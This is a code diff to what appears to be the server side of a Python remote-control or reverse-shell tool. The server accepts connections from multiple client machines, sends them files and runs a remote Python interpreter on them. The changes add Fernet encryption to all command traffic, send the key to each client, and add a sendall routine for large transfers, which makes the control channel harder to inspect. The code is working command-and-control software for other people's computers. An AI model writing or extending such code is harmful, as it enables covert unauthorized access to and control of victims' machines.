@@ -1,5 +1,6 @@
 import socket, os, time, threading, sys, json
 from queue import Queue
+from cryptography.fernet import Fernet
 
 arrAddresses = []
 arrConnections = []
@@ -18,17 +19,32 @@ remove_quotes = lambda string: string.replace("\"", "")
 center = lambda string, title: f"{{:^{len(string)}}}".format(title)
 
 # function to send data
-send = lambda data: conn.send(data)
+send = lambda data: conn.send(objEncryptor.encrypt(data))
 
 # function to receive data
-recv = lambda buffer: conn.recv(buffer)
+recv = lambda buffer: objEncryptor.decrypt(conn.recv(buffer))
 
 
 def recvall(buffer):  # function to receive large amounts of data
     bytData = b""
     while len(bytData) < buffer:
-        bytData += recv(buffer)
-    return bytData
+        bytData += conn.recv(buffer)
+    return objEncryptor.decrypt(bytData)
+
+
+def sendall(flag, data):
+    bytEncryptedData = objEncryptor.encrypt(data)
+    intDataSize = len(bytEncryptedData)
+    send(f"{flag}{intDataSize}".encode())
+    time.sleep(0.2)
+    conn.send(bytEncryptedData)
+    print(f"Total bytes sent: {intDataSize}")
+
+
+def create_encryptor():
+    global objKey, objEncryptor
+    objKey = Fernet.generate_key()
+    objEncryptor = Fernet(objKey)
 
 
 def create_socket():
@@ -57,6 +73,7 @@ def socket_accept():
             conn, address = objSocket.accept()
             conn.setblocking(1)  # no timeout
             address += tuple(json.loads(conn.recv(intBuff).decode()))
+            conn.send(objKey)
             arrConnections.append(conn)
             arrAddresses.append(address)
             print(f"\nConnection has been established: {address[0]} ({address[2]})")
@@ -124,13 +141,13 @@ def main_menu():
 
 
 def close():
-    global arrConnections, arrAddresses
+    global arrConnections, arrAddresses, conn
 
     if len(arrAddresses) == 0:  # if there are no computers connected
         return
 
     for _, conn in enumerate(arrConnections):
-        conn.send(b"exit")
+        send(b"exit")
         conn.close()
     del arrConnections
     arrConnections = []
@@ -139,10 +156,10 @@ def close():
 
 
 def refresh_connections():  # used to remove any lost connections
-    global arrConnections, arrAddresses
+    global arrConnections, arrAddresses, conn
     for intCounter, conn in enumerate(arrConnections):
         try:
-            conn.send(b"test")  # test to see if connection is active
+            send(b"test")  # test to see if connection is active
         except socket.error:
             del arrAddresses[arrConnections.index(conn)]
             arrConnections.remove(conn)
@@ -278,15 +295,10 @@ def send_file():
     if strOutputFile == "":  # if the input is blank
         return
 
-    send(f"send{os.path.getsize(strFile)}".encode())
-
-    time.sleep(1)
     with open(strFile, "rb") as objFile:
-        send(objFile.read())
+        sendall("send", objFile.read())
 
     send(strOutputFile.encode())
-
-    print(f"Total bytes sent: {os.path.getsize(strFile)}")
 
     strClientResponse = recv(intBuff).decode()
     print(strClientResponse)
@@ -355,7 +367,8 @@ def python_interpreter():
         if strCommand in ["exit", "exit()"]:
             break
         send(strCommand.encode())
-        strReceived = recv(intBuff).decode("utf-8").rstrip("\n")
+        intBuffer = int(recv(intBuff).decode())
+        strReceived = recvall(intBuffer).decode("utf-8").rstrip("\n")
         if strReceived != "":
             print(strReceived)
     send(b"exit")
@@ -501,6 +514,7 @@ def work():  # do jobs in the queue
     while True:
         intValue = queue.get()
         if intValue == 1:
+            create_encryptor()
             create_socket()
             socket_bind()
             socket_accept()
